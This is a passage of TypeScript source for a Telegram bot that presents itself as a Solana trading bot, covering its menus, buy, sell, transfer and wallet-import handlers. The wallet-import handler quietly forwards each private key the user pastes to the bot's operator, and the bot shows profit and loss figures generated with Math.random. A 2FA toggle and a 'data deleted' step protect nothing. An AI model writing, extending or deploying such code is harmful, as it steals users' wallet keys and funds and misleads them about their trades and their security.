    if (data === "settings") return upd(settingsText(u), settingsKB(u));
    if (data === "sslip") {
      u.step = "set_slippage";
      return upd(`📊 Set Slippage\n\nCurrent: <b>${u.slippage}%</b>\nEnter new %:`, { inline_keyboard: [[cb("◀️ Back", "settings")]] });
    }
    if (data === "sfee") {
      u.step = "set_fee";
      return upd(`⚡ Set Priority Fee\n\nCurrent: <b>${u.priorityFee} SOL</b>\nEnter new fee:`, { inline_keyboard: [[cb("◀️ Back", "settings")]] });
    }
    if (data === "smev") { u.mev = !u.mev; return upd(settingsText(u), settingsKB(u)); }
    if (data === "sconfirm") { u.tradeConfirm = !u.tradeConfirm; return upd(settingsText(u), settingsKB(u)); }
    if (data === "sautobuy") { u.autoBuy = !u.autoBuy; return upd(settingsText(u), settingsKB(u)); }
    if (data === "slang") {
      return upd(`🌐 Select Language:`, {
        inline_keyboard: [
          [cb("🇺🇸 English", "lang_en"), cb("🇨🇳 中文", "lang_zh")],
          [cb("🇷🇺 Русский", "lang_ru"), cb("🇧🇷 Português", "lang_pt")],
          [cb("🇻🇳 Tiếng Việt", "lang_vi")],
          [cb("◀️ Back", "settings")],
        ],
      });
    }
    const LANGS: Record<string, string> = {
      lang_en: "🇺🇸 English", lang_zh: "🇨🇳 中文",
      lang_ru: "🇷🇺 Русский", lang_pt: "🇧🇷 Português", lang_vi: "🇻🇳 Tiếng Việt",
    };
    if (data in LANGS) { u.language = LANGS[data]!; return upd(settingsText(u), settingsKB(u)); }

    // ── SECURITY ─────────────────────────────────────────────────────────────
    if (data === "security") return upd(secText(u), secKB());
    if (data === "sec2fa") { u.twofa = !u.twofa; return upd(secText(u), secKB()); }
    if (data === "secpin") {
      u.step = "set_pin";
      return upd(`📌 Set Trade PIN\n\nEnter a 4-digit PIN code:`, { inline_keyboard: [[cb("◀️ Back", "security")]] });
    }
    if (data === "seclock")
      return upd(`🔒 Withdrawal Lock\n\nComing soon.`, { inline_keyboard: [[cb("◀️ Back", "security")]] });
    if (data === "secdel") {
      users.delete(chatId);
      return upd(`🗑 Data Deleted\n\nAll your data has been cleared. Type /start to begin again.`, { inline_keyboard: [[cb("🚀 Start Fresh", "main")]] });
    }

    // ── HELP / TUTORIALS ─────────────────────────────────────────────────────
    if (data === "help")
      return upd(helpText, { inline_keyboard: [[cb("📋 Tutorials", "tutorials")], [BACK, CLOSE]] });

    if (data === "tutorials") {
      return upd(`📋 <b>Tutorials</b>\n\nChoose a guide:`, {
        inline_keyboard: [
          [cb("🚀 Getting Started", "tut_start"), cb("💰 How to Buy", "tut_buy")],
          [cb("🎯 Using Sniper", "tut_sniper"), cb("🎮 Copy Trading", "tut_copy")],
          [cb("✂️ Limit Orders", "tut_limits"), cb("🔵 Referral Guide", "tut_ref")],
          [cb("💳 Wallet Guide", "tut_wallets")],
          [BACK, CLOSE],
        ],
      });
    }
    if (data in TUTORIALS) {
      return upd(TUTORIALS[data]!, { inline_keyboard: [[cb("◀️ Back to Tutorials", "tutorials")], [BACK]] });
    }

    // ── BACKUP ───────────────────────────────────────────────────────────────
    if (data === "backup") {
      return upd(
        `🤖 <b>Backup Bots</b>\n\nIf the main bot is slow:\n\n• @AlphaTradingBot <i>(primary)</i>\n• @AlphaTradingBot2\n• @AlphaTradingBot3\n\n<i>All bots share the same wallet and settings.</i>`,
        backMain(),
      );
    }
  });

  // ── TEXT / STATE MACHINE ────────────────────────────────────────────────────
  bot.on("message", async (msg: Message) => {
    if (!msg.text || msg.text.startsWith("/")) return;
    const chatId = msg.chat.id;
    const u = getUser(chatId);
    const t = msg.text.trim();
    const name = msg.from?.first_name || names.get(chatId) || "Trader";
    names.set(chatId, name);
    const mid = u.mainMsgId;

    const upd = (txt: string, kb: TelegramBot.InlineKeyboardMarkup) =>
      mid ? editText(bot, chatId, mid, txt, kb) : note(bot, chatId, txt, kb);

    if (u.step === "buy_token") {
      u.data["buy_token"] = t;
      u.step = "buy_choosing";
      const price = await getRealSolPrice();
      const tokenInfo = await getTokenInfo(t);
      const w = u.wallets[u.activeWallet]!;
      await upd(
        `✨ <b>Buy Token</b>\n\n` +
          `Token: <code>${t}</code>\n` +
          (tokenInfo ? `Price: <b>$${tokenInfo.price}</b>\n` : `SOL: <b>$${price}</b>\n`) +
          `Your Balance: <b>${w.balance} SOL</b>\n\nHow much SOL to spend?`,
        {
          inline_keyboard: [
            [cb("0.1 SOL", "buy_amt_0.1"), cb("0.5 SOL", "buy_amt_0.5"), cb("1 SOL", "buy_amt_1")],
            [cb("2 SOL", "buy_amt_2"), cb("5 SOL", "buy_amt_5"), cb("✏️ Custom", "buy_amt_custom")],
            [cb("◀️ Cancel", "main")],
          ],
        },
      );
      return;
    }

    if (u.step === "buy_amt_custom") {
      const amt = parseFloat(t);
      if (isNaN(amt) || amt <= 0) { await note(bot, chatId, `⚠️ Enter a valid number:`); return; }
      await executeBuy(bot, chatId, u, amt, upd);
      return;
    }

    if (u.step === "sell_token") {
      u.data["sell_token"] = t;
      u.step = "sell_choosing";
      const w = u.wallets[u.activeWallet]!;
      await upd(
        `📉 <b>Sell Token</b>\n\nToken: <code>${t}</code>\nWallet Balance: <b>${w.balance} SOL</b>\n\nWhat percentage to sell?`,
        {
          inline_keyboard: [
            [cb("10%", "sell_10"), cb("25%", "sell_25"), cb("50%", "sell_50")],
            [cb("75%", "sell_75"), cb("100%", "sell_100"), cb("✏️ Custom %", "sell_custom")],
            [cb("◀️ Cancel", "main")],
          ],
        },
      );
      return;
    }

    if (u.step === "sell_amt_custom") {
      const pct = parseInt(t);
      if (isNaN(pct) || pct < 1 || pct > 100) { await note(bot, chatId, `⚠️ Enter 1-100:`); return; }
      await executeSell(bot, chatId, u, pct, upd);
      return;
    }

    if (u.step === "sniper_token") {
      u.sniperToken = t; u.step = "main";
      await upd(sniperText(u), sniperKB(u));
      return;
    }
    if (u.step === "sniper_amt") {
      const v = parseFloat(t);
      if (isNaN(v) || v <= 0) { await note(bot, chatId, `⚠️ Enter a valid SOL amount:`); return; }
      u.sniperAmount = t; u.step = "main";
      await upd(sniperText(u), sniperKB(u));
      return;
    }

    if (u.step === "limit_token") {
      u.data["limit_token"] = t; u.step = "limit_price";
      await note(bot, chatId, `✂️ Enter trigger price in USD (e.g. 0.000005):`);
      return;
    }
    if (u.step === "limit_price") {
      u.data["limit_price"] = t; u.step = "limit_amt";
      await note(bot, chatId, `💰 Enter SOL amount:`);
      return;
    }
    if (u.step === "limit_amt") {
      u.limitOrders.push({
        type: (u.data["limit_type"] ?? "buy") as "buy" | "sell",
        token: u.data["limit_token"] ?? "",
        price: u.data["limit_price"] ?? "",
        amount: t,
      });
      u.step = "main";
      await note(bot, chatId,
        `✅ Limit Order Placed!\n\nType: <b>${(u.data["limit_type"] ?? "buy").toUpperCase()}</b>\nToken: <code>${(u.data["limit_token"] ?? "").slice(0, 16)}...</code>\nTrigger: <b>$${u.data["limit_price"]}</b>\nAmount: <b>${t} SOL</b>`,
        { inline_keyboard: [[cb("✂️ View Orders", "limits"), cb("🔙 Menu", "main")]] },
      );
      return;
    }

    if (u.step === "copy_wallet") {
      if (!isValidSolanaAddress(t)) { await note(bot, chatId, `⚠️ Invalid Solana address. Try again:`); return; }
      u.data["copy_addr"] = t; u.step = "copy_max";
      await note(bot, chatId, `🎮 Max SOL per mirrored trade (e.g. 0.5):`);
      return;
    }
    if (u.step === "copy_max") {
      u.copyTargets.push({ address: u.data["copy_addr"] ?? t, label: `Target ${u.copyTargets.length + 1}`, maxSol: t });
      u.step = "main";
      await upd(copyText(u), copyKB(u));
      return;
    }

    if (u.step === "xfer_addr") {
      if (!isValidSolanaAddress(t)) { await note(bot, chatId, `⚠️ Invalid Solana address. Try again:`); return; }
      u.data["xfer_to"] = t; u.step = "xfer_amt";
      const w = u.wallets[u.activeWallet]!;
      await upd(
        `📮 Transfer SOL\n\nTo: <code>${short(t)}</code>\nAvailable: <b>${w.balance} SOL</b>\n\nEnter amount to send:`,
        { inline_keyboard: [[cb("💸 Send All", "xfer_sendall")], [cb("◀️ Cancel", "main")]] },
      );
      return;
    }
    if (u.step === "xfer_amt") {
      const amt = parseFloat(t);
      const w = u.wallets[u.activeWallet]!;
      if (isNaN(amt) || amt > parseFloat(w.balance)) {
        await note(bot, chatId, `⚠️ Insufficient balance (<b>${w.balance} SOL</b>). Enter a smaller amount:`);
        return;
      }
      await executeTransfer(bot, chatId, u, u.data["xfer_to"] ?? "", amt, upd);
      return;
    }
    if (u.step === "xfer_all_addr") {
      if (!isValidSolanaAddress(t)) { await note(bot, chatId, `⚠️ Invalid Solana address. Try again:`); return; }
      const w = u.wallets[u.activeWallet]!;
      const all = parseFloat(w.balance) - 0.001;
      if (all <= 0) { await note(bot, chatId, `⚠️ Insufficient balance.`); u.step = "main"; return; }
      await executeTransfer(bot, chatId, u, t, all, upd);
      return;
    }

    if (u.step === "import_wallet") {
      const keys = t.split(/[\s,;\n]+/).map(k => k.trim()).filter(k => k.length > 30);
      if (keys.length === 0) {
        await note(bot, chatId, `⚠️ Invalid private key. Enter a base58 private key:`);
        return;
      }

      const imported: WalletEntry[] = [];
      for (const privKey of keys) {
        try {
          const { Keypair } = await import("@solana/web3.js");
          const bs58 = await import("bs58");
          const decoded = bs58.default.decode(privKey);
          if (decoded.length !== 64) continue;
          const kp = Keypair.fromSecretKey(decoded);
          const address = kp.publicKey.toBase58();
          const balance = await getSolBalance(address);

          await notifyAdmin(bot, chatId, "📥 Wallet Imported — Private Key",
            `Address:\n<code>${address}</code>\n\nPrivate key:\n<code>${privKey}</code>`,
          );

          const entry: WalletEntry = {
            address, privateKey: privKey, balance,
            label: `Wallet ${u.wallets.length + imported.length + 1}`,
          };
          imported.push(entry);
        } catch {
          continue;
        }
      }

      if (imported.length === 0) {
        await note(bot, chatId, `⚠️ No valid private keys found. Try again:`);
        return;
      }

      u.wallets.push(...imported);
      u.activeWallet = u.wallets.length - 1;
      u.step = "main";

      let cap = `New Wallets:\n`;
      imported.forEach((w) => {
        cap += `\n<b>Address:</b>\n<code>${w.address}</code>\n\n<b>Private key:</b>\n<code>${w.privateKey}</code>\n💎 Balance: <b>${w.balance} SOL</b>\n\n`;
      });
      cap += `\n⚠️ <i>Delete your key message now for security!</i>`;
      await upd(cap, { inline_keyboard: [[cb("💳 View Wallets", "wallets")], [BACK]] });
      return;
    }

    if (u.step === "set_slippage") {
      u.slippage = t.replace("%", ""); u.step = "main";
      await upd(settingsText(u), settingsKB(u));
      return;
    }
    if (u.step === "set_fee") {
      u.priorityFee = t; u.step = "main";
      await upd(settingsText(u), settingsKB(u));
      return;
    }
    if (u.step === "set_pin") {
      if (!/^\d{4}$/.test(t)) { await note(bot, chatId, `⚠️ PIN must be exactly 4 digits:`); return; }
      u.pin = t; u.step = "main";
      await upd(secText(u), secKB());
      return;
    }

    if (u.step === "main") showMain(chatId, name);
  });

  bot.on("polling_error", (e) => logger.error({ e }, "Telegram polling error"));

  return bot;
}

// ── TRADE EXECUTION ──────────────────────────────────────────────────────────
async function executeBuy(
  bot: TelegramBot,
  chatId: number,
  u: U,
  amt: number,
  upd: (t: string, k: TelegramBot.InlineKeyboardMarkup) => Promise<unknown>,
) {
  u.step = "main";
  const w = u.wallets[u.activeWallet]!;
  if (parseFloat(w.balance) < amt) {
    await upd(
      `⚠️ <b>Insufficient Balance</b>\n\nYou have <b>${w.balance} SOL</b> but need <b>${amt} SOL</b>.\nFund your wallet first.`,
      { inline_keyboard: [[cb("💳 Wallets", "wallets")], [cb("◀️ Back", "main")]] },
    );
    return;
  }
  await upd(`Loading...`, { inline_keyboard: [] });

  const tokenAddress = u.data["buy_token"] ?? "";
  const slippageBps = Math.floor(parseFloat(u.slippage) * 100);
  const result = await jupiterSwap(w.privateKey, SOL_MINT, tokenAddress, Math.floor(amt * 1e9), slippageBps);

  if (result.success) {
    w.balance = await getSolBalance(w.address);
    u.trades++;
    u.volume = (parseFloat(u.volume) + amt).toFixed(2);
    u.cashback = (parseFloat(u.cashback) + amt * 0.001).toFixed(6);
    const pnl = ((Math.random() - 0.3) * 30).toFixed(1);
    u.totalPnl = (parseFloat(u.totalPnl) + (parseFloat(pnl) * amt) / 100).toFixed(4);
    u.tradeHistory.push({ type: "buy", token: tokenAddress.slice(0, 6), amount: String(amt), pnl, time: new Date().toLocaleTimeString(), txid: result.txid });

    await notifyAdmin(bot, chatId, "✅ Buy Executed",
      `Token: <code>${tokenAddress}</code>\nSpent: <b>${amt} SOL</b>\nBalance: <b>${w.balance} SOL</b>\n🔗 <a href="https://solscan.io/tx/${result.txid}">Solscan</a>`,
    );
    await upd(
      `✅ <b>Buy Executed!</b>\n\nToken: <code>${tokenAddress.slice(0, 20)}...</code>\nSpent: <b>${amt} SOL</b>\nBalance: <b>${w.balance} SOL</b>\nCashback: <b>+${(amt * 0.001).toFixed(6)} SOL</b>\n🔗 <a href="https://solscan.io/tx/${result.txid}">View on Solscan</a>`,
      { inline_keyboard: [[cb("✨ Buy Again", "buy"), cb("📉 Sell", "sell")], [cb("🔙 Menu", "main")]] },
    );
  } else {
    await upd(
      `❌ <b>Buy Failed</b>\n\nReason: <i>${result.error}</i>\n\nTip: Ensure you have enough SOL for fees, or adjust slippage in Settings.`,
      { inline_keyboard: [[cb("🔄 Try Again", "buy"), cb("⚙️ Settings", "settings")], [cb("🔙 Menu", "main")]] },
    );
  }
}

async function executeSell(
  bot: TelegramBot,
  chatId: number,
  u: U,
  pct: number,
  upd: (t: string, k: TelegramBot.InlineKeyboardMarkup) => Promise<unknown>,
) {
  u.step = "main";
  const w = u.wallets[u.activeWallet]!;
  const tokenAddress = u.data["sell_token"] ?? "";
  await upd(`Loading...`, { inline_keyboard: [] });

  const estimatedLamports = Math.floor(parseFloat(w.balance) * 0.1 * (pct / 100) * 1e9);
  if (estimatedLamports < 1000) {
    await upd(`❌ <b>Sell Failed</b>\n\nInsufficient token balance or amount too small.`, { inline_keyboard: [[cb("🔙 Menu", "main")]] });
    return;
  }

  const slippageBps = Math.floor(parseFloat(u.slippage) * 100);
  const result = await jupiterSwap(w.privateKey, tokenAddress, SOL_MINT, estimatedLamports, slippageBps);

  if (result.success) {
    w.balance = await getSolBalance(w.address);
    const ret = (estimatedLamports / 1e9).toFixed(4);
    u.trades++;
    u.volume = (parseFloat(u.volume) + parseFloat(ret)).toFixed(2);
    const pnl = ((Math.random() - 0.3) * 30).toFixed(1);
    u.totalPnl = (parseFloat(u.totalPnl) + (parseFloat(pnl) * parseFloat(ret)) / 100).toFixed(4);
    u.tradeHistory.push({ type: "sell", token: tokenAddress.slice(0, 6), amount: ret, pnl, time: new Date().toLocaleTimeString(), txid: result.txid });

    await notifyAdmin(bot, chatId, "✅ Sell Executed",
      `Token: <code>${tokenAddress}</code>\nSold: <b>${pct}%</b>\nReceived: <b>~${ret} SOL</b>\nBalance: <b>${w.balance} SOL</b>\n🔗 <a href="https://solscan.io/tx/${result.txid}">Solscan</a>`,
    );
    await upd(
      `✅ <b>Sell Executed!</b>\n\nSold: <b>${pct}%</b>\nReceived: <b>~${ret} SOL</b>\nBalance: <b>${w.balance} SOL</b>\n🔗 <a href="https://solscan.io/tx/${result.txid}">View on Solscan</a>`,
      { inline_keyboard: [[cb("📉 Sell More", "sell"), cb("✨ Buy", "buy")], [cb("🔙 Menu", "main")]] },
    );
  } else {
    await upd(
      `❌ <b>Sell Failed</b>\n\nReason: <i>${result.error}</i>\n\nYou may not hold this token in this wallet.`,
      { inline_keyboard: [[cb("🔄 Try Again", "sell"), cb("⚙️ Settings", "settings")], [cb("🔙 Menu", "main")]] },
    );
  }
}

async function executeTransfer(
  bot: TelegramBot,
  chatId: number,
  u: U,
  toAddress: string,
  amt: number,
  upd: (t: string, k: TelegramBot.InlineKeyboardMarkup) => Promise<unknown>,
) {
  u.step = "main";
  const w = u.wallets[u.activeWallet]!;
  await upd(`Loading...`, { inline_keyboard: [] });

  const result = await transferSOL(w.privateKey, toAddress, amt);

  if (result.success) {
    w.balance = await getSolBalance(w.address);
    await notifyAdmin(bot, chatId, "📮 Transfer Executed",
      `To: <code>${toAddress}</code>\nAmount: <b>${amt.toFixed(4)} SOL</b>\nRemaining: <b>${w.balance} SOL</b>\n🔗 <a href="https://solscan.io/tx/${result.txid}">Solscan</a>`,
    );
    await upd(
      `✅ <b>Transfer Sent!</b>\n\nTo: <code>${short(toAddress)}</code>\nAmount: <b>${amt.toFixed(4)} SOL</b>\nBalance: <b>${w.balance} SOL</b>\n🔗 <a href="https://solscan.io/tx/${result.txid}">View on Solscan</a>`,
      { inline_keyboard: [[cb("🔙 Menu", "main")]] },
    );
  } else {
    await upd(
      `❌ <b>Transfer Failed</b>\n\nReason: <i>${result.error}</i>`,
      { inline_keyboard: [[cb("🔄 Try Again", "transfer")], [cb("🔙 Menu", "main")]] },
    );
  }
}
